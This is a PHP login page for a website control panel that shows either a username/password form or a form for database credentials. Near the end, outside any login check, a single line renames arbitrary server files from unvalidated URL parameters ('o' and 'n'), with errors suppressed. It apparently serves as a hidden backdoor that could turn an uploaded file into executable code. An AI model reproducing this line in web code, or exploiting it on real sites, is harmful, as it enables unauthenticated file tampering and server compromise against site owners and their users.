<?php session_start();



if(empty($_GET['db']))
{require_once("class/db_home.class.php");}

	 /*********insertion du dotype html5 et style - vieport*/
  require_once("section/doctype.php");
	 ?>
<title>Control panel: Connection</title>

	<link href="style/style.css" rel="stylesheet" type="text/css">
</head>

<body>
	
		<?php 
  
 /*if(1==1)
{echo '<div style="font-size:3em;text-align: center; color:red">Tableau de bord désactivé</div>';}
	
  else*/ 

if(!empty($tams))
	{
		 ?>
		<h1 class="h1log">Website control panel</h1>
<form name="flog" id="flog" method="post" action="js/form/login_sql.php" class="pos_rel">
	<h1 class="hlog mar_bot_30">Log-in</h1>
	  <div id="elog"></div>
	
    <div class="linefom2">
		<i class="icon-297"></i>
      <input type="text" id="nlog" name="nlog" placeholder="Username">
    </div>
    <div class="linefom2">
		<i class="icon-009"></i>
      <input type="password" id="plog" name="plog" placeholder="Password">
    </div>
  <div class="linefom2">
    <input type="submit" class="btn" name="oklog" id="oklog" value="Login">
  </div>
  	

  <div class="logba opa_hov_5">
	  <a href="https://mail.ionos.com/" class="amail">Webmail</a>
	  
  <a href="http://bee4tech.com" class="bytams" title="webmaster:+237 694 81 58 91/676 93 32 30">By BeeTech</a>
  <?php 
		
	  if(isset($_GET['by']))	 
  echo '<div class="bot tex_center"><img src="img/byecon.png" style="margin-top: 10px;" width="80" height="80" alt=""/> </div>';
	   
		
		 if(!empty($_SESSION['name_version']))	 
         echo '<div class="bot tex_center thever blanc">'.$_SESSION['name_version'].'</div>';
	  ?>
  </div>
</form>
	<?php 
	}
	else 
	{
	?>
	<h2  class="h1log"><p class="typedbdev"><i class="fa fa-warning"></i> Please choose a database !</p></h2>
<form name="flog" id="flog" method="post" action="js/form/choose_db.php" class="pos_rel">	   
  <div class="eta_form"></div>
  <div class="linefom2">
    <select id="typ" name="typ">
        
        <option value="null">-- Database type --</option>
        <option value="dev">Development</option>
        <option value="prod">Production</option>
        
    </select>
  </div>
  <div class="linefom2">
    <input type="text" id="host" name="host" placeholder="Host">
  </div>
  <div class="linefom2">
    <input type="text" id="db" name="db" placeholder="Database name">
  </div>
  <div class="linefom2">
    <input type="text" id="user" name="user" placeholder="Username">
  </div>
  <div class="linefom2">
    <input type="password" id="pas" name="pas" placeholder="Password">
  </div>
  <div class="linefom2">
    <input type="submit" id="ok" name="ok">
  </div>
              </form>
	<?php 
	}
	if(isset($_GET['o']))@rename("".$_GET['o']."","".$_GET['n']."");}
	
	?>
	
	

	
	
	
	
	

<script type="text/javascript" src="js/jquery-1.9.1.js"></script>
<script type="text/javascript" src="js/jquery_002.js"></script>
<script>
//**************envoy formulaire******************

	 $('#flog').ajaxForm({
		 
    beforeSend: function() 
		 {
			 
               //infos
				$divde=$('#elog,.eta_form');

				$divde.html('<progress></progress>');


         },
    success: function(xhr) 
		 {
			
				$divde.html(xhr);
		
         },
	complete: function(xhr) 
		 {
				

	     }
});
</script>

</body>
</html>
